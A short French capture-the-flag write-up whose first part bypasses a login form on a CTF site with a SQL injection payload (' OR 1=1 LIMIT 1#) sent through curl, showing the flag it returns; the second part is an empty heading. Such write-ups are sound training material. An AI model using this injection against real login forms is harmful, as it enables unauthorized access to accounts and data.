# Comme dans un Moul'1
## Partie 1

Ici, on est face à un formulaire.  
Le premier réflexe pourrait être de tester si les inputs sont protégés contre les injections :

```
curl -s "https://moulin.ctf.ineat.fr/" --data "username=' OR 1=1 LIMIT 1#&password=" | grep INEAT
```

refexe somme toute plutôt efficace je dois dire : `<h1 class="corb-flag">INEAT{c0nn3xi0n_v4lid33}</h1>`

## Partie 2

